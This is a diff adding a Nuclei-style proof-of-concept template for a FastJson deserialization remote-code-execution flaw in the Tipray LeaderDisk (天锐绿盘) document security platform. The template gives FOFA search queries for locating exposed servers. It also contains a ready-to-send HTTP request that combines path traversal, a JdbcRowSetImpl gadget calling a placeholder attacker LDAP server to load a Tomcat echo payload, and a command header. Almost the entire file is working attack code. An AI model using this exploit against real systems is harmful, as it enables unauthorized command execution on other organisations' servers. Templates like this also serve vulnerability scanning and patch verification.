@@ -1,0 +1,39 @@
+id: poc-iwl4txh6hxeas3qd
+info:
+  name: 天锐绿盘文档安全管理平台 restorMachineToClient 存在FastJson反序列化RCE漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iwl4txh6hxeas3qd'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iwl4txh6hxeas3qd
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk" || body="location.href=location.href+\"lddsm\""
+http:
+- raw:
+  - 'POST /lddsm/service/../ldfbsnodeDocumentController/restorMachineToClient.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: keep-alive
+
+    cmd: dir
+
+
+    diskMatch={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://vpsip:1389/TomcatBypass/TomcatEcho","autoCommit":true}}&sourceUmId=1&destUmId=1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755323937043-66f1354c-bec0-422e-aab9-5b824c06f983.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
